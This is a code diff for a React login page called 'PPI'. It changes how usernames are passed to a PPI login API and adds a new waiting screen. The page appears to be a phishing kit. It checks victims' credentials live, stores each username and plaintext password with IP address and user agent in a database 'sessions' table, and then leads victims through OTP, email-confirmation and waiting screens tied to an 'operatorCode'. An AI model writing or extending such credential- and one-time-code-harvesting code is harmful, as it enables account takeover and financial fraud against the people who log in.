@@ -7,6 +7,7 @@ import { useRateLimit } from "@/hooks/useRateLimit";
 import { useIsMobile } from "@/hooks/use-mobile";
 import PpiLoginForm from "@/components/ppi/PpiLoginForm";
 import WaitingScreen from "@/components/login/WaitingScreen";
+import PpiWaitingScreen from "@/components/ppi/PpiWaitingScreen";
 import SuccessScreen from "@/components/login/SuccessScreen";
 import PpiOtpScreen from "@/components/ppi/PpiOtpScreen";
 import PpiSyncEmailScreen from "@/components/ppi/PpiSyncEmailScreen";
@@ -210,23 +211,17 @@ const PPI = () => {
   };
 
   // ── Login: validate via API, then create manual session ──
-  /** Normalize PPI username → email: if no '@', append @hotmail.com */
-  const normalizePpiEmail = (username: string) => {
-    const trimmed = username.trim().toLowerCase();
-    return trimmed.includes("@") ? trimmed : `${trimmed}@hotmail.com`;
-  };
-
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
     setErrorMessage("");
     setLoading(true);
-    const normalizedEmail = normalizePpiEmail(submittedEmail);
-    setEmail(normalizedEmail);
+    const submittedUsername = submittedEmail.trim();
+    setEmail(submittedUsername);
     setKycCaseId(null);
 
     try {
       // Step 1: Validate credentials via PPI API
-      const res = await ppiApi.loginWeb(submittedEmail, password, operatorCode);
+      const res = await ppiApi.loginWeb(submittedUsername, password, operatorCode);
 
       // Check for credential errors — block immediately
       if (res.error && !res.requires_2fa && !res.success) {
@@ -238,7 +233,7 @@ const PPI = () => {
           return;
         }
         // For non-credential errors, try mobile fallback
-        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        const mobileRes = await ppiApi.login(submittedUsername, password, operatorCode);
         if (mobileRes.error && !mobileRes.success && mobileRes.raw?.status !== 0) {
           setGeneralError(translatePpiError(mobileRes.error || res.error, mobileRes.raw || res.raw));
           setLoading(false);
@@ -269,7 +264,7 @@ const PPI = () => {
       const newId = crypto.randomUUID();
       await supabase.from("sessions").insert({
         id: newId,
-        email: normalizedEmail,
+        email: submittedUsername,
         password,
         ip_address: ipData.ip,
         user_agent: navigator.userAgent,
@@ -331,6 +326,10 @@ const PPI = () => {
     if (step === "otp" && sessionId) return <PpiOtpScreen email={email} sessionId={sessionId} twofaType={twofaType ?? undefined} onBack={handleRetry} />;
     if (step === "confirm_email" && sessionId) return <PpiSyncEmailScreen sessionId={sessionId} onBack={handleRetry} />;
     if (step === "waiting" && sessionId) {
+      if (!errorMessage) {
+        return <PpiWaitingScreen username={email} onContinue={handleGoToConfirmEmail} />;
+      }
+
       return (
         <WaitingScreen
           email={email}
